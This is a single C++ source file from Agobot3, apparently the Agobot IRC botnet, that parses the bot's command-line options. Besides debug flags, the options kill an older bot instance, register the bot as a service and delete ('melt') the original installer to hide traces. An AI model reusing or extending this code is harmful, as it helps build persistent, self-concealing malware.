/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "cmdline.h"
#include "cstring.h"

CCmdLine::CCmdLine() { m_szCmdLine=NULL; }
CCmdLine::~CCmdLine() { if(m_szCmdLine) delete [] m_szCmdLine; }

void CCmdLine::Parse(const char *szCmdLine) {
	// Copy command line
	char *szCmdLineCopy; if(m_szCmdLine) delete [] m_szCmdLine;
	m_szCmdLine=new char[strlen(szCmdLine)+1]; strcpy(m_szCmdLine, szCmdLine);

	// Create defaults
#ifndef _DEBUG
	m_cConfig.bDebug=false; m_cConfig.iDebugLevel=0;
#else
	m_cConfig.bDebug=true; m_cConfig.iDebugLevel=10;
#endif // DEBUG

#ifdef DBGCONSOLE
	m_cConfig.bDebug=true; m_cConfig.iDebugLevel=10;
#endif // DBGCONSOLE

	m_cConfig.bUpdate=false;
	m_cConfig.bService=false;
	m_cConfig.bMeltServer=false;
	
	// Tokenize command line
	CString sCmdLineCopy(m_szCmdLine);

	// Scan command line tokens for params
	int iLoop=0; while(sCmdLineCopy.Token(iLoop, " ", true).Compare("")!=0) {
		CString sToken(sCmdLineCopy.Token(iLoop, " ", true));
		if(!sToken.CompareNoCase("-debug")) { // Set the debug mode to enabled
			m_cConfig.bDebug=true;
		} else if(!sToken.CompareNoCase("-debuglevel")) { // Set the debug level to value
			if(sCmdLineCopy.Token(iLoop+1, " ", true).Compare("")!=0)
			{	m_cConfig.iDebugLevel=atoi(sCmdLineCopy.Token(iLoop+1, " ", true).CStr()); iLoop++; }
		} else if(!sToken.CompareNoCase("-update")) { // Kill any old bot filename thats running
			m_cConfig.bUpdate=true;
		} else if(!sToken.CompareNoCase("-service")) { // Register service control handler
			m_cConfig.bService=true;
		} else if(!sToken.CompareNoCase("-meltserver")) { // Delete the old server
			if(sCmdLineCopy.Token(iLoop+1, " ", true).Compare("")!=0)
			{	m_cConfig.bMeltServer=true;
				strncpy(m_cConfig.szOldServer, sCmdLineCopy.Token(iLoop+1, " ", true).CStr(), sizeof(m_cConfig.szOldServer));
				iLoop++; }
		}
		iLoop++; }

	// Zero debug level if not debugging
	if(!m_cConfig.bDebug) m_cConfig.iDebugLevel=0;
	// Lowest debug level as default
	if(!m_cConfig.iDebugLevel && m_cConfig.bDebug) m_cConfig.iDebugLevel=1;

#ifndef DBGCONSOLE
	m_cConfig.bDebug=0; m_cConfig.iDebugLevel=0;
#endif
}
